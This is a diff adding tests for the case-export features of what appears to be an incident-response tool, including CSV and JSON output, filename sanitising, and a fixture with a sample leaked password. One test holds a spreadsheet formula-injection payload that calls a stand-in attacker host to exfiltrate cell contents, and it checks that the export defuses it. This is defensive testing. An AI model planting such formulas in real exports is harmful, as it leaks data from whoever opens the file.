@@ -85,3 +85,47 @@ test("a subject that would be a bad filename is made into a safe one", () => {
   const n = exportName(buildReport(buildSubject("Jean Pierre Dupont"), []), "json");
   assert.ok(!/[/\\:*?"<>|]/.test(n), "nothing a filesystem would refuse");
 });
+
+// ---- a case, out of the tool ---------------------------------------------------------
+
+import { caseToCSV, caseToJSON, caseExportName } from "../lib/export.ts";
+import { buildBoard } from "../lib/casework.ts";
+
+const FILE = { id: "c1", ref: "INC-2026-114", title: "Stealer log", status: "open" as const, openedBy: "a@corp", openedAt: 1700000000000 };
+const ENTS = [{ id: "e1", kind: "email" as const, value: "l.m@example.com", label: "stealer log 14", addedAt: 1700000000000 }];
+const FACTS = [{
+  id: "f1", entityId: "e1", category: "password", severity: "critical" as const,
+  label: "Password", value: "Sablon2019!", source: "Vectra Fitness 2019", addedBy: "a@corp", addedAt: 1700000000000,
+}];
+
+test("a case export carries who pinned what, out of which database", () => {
+  const csv = caseToCSV(FILE, ENTS, FACTS);
+  assert.match(csv, /INC-2026-114/);
+  assert.match(csv, /stealer log 14/);
+  assert.match(csv, /Vectra Fitness 2019/);
+  assert.match(csv, /a@corp/);
+});
+
+// The export is opened in a spreadsheet by a responder under time pressure, which is
+// the best possible moment to land a payload on somebody.
+test("a pinned value that is a formula is neutralised on the way out", () => {
+  const evil = [{ ...FACTS[0], value: '=HYPERLINK("http://attacker/"&A1,"open")' }];
+  const csv = caseToCSV(FILE, ENTS, evil);
+  assert.ok(csv.includes(`"'=HYPERLINK`), "the leading = must be defused");
+  assert.ok(!/\n"=/.test(csv) && !csv.includes(',"=HYPERLINK'), "and never left bare");
+});
+
+test("the JSON marks the board as derived rather than as evidence", () => {
+  const board = buildBoard(ENTS, FACTS);
+  const d = JSON.parse(caseToJSON(FILE, ENTS, FACTS, board, "a@corp"));
+  assert.equal(d.case.ref, "INC-2026-114");
+  assert.equal(d.facts.length, 1);
+  assert.match(d.derived.note, /conclusion, not evidence/);
+  assert.equal(d.exportedBy, "a@corp");
+});
+
+test("the filename says what it is and sorts by date", () => {
+  assert.equal(caseExportName(FILE, "csv", new Date("2026-03-11T09:00:00Z")), "case-INC-2026-114-2026-03-11.csv");
+  // a reference with a slash in it must not become a path
+  assert.equal(caseExportName({ ...FILE, ref: "a/b c" }, "json", new Date("2026-03-11T09:00:00Z")), "case-a_b_c-2026-03-11.json");
+});
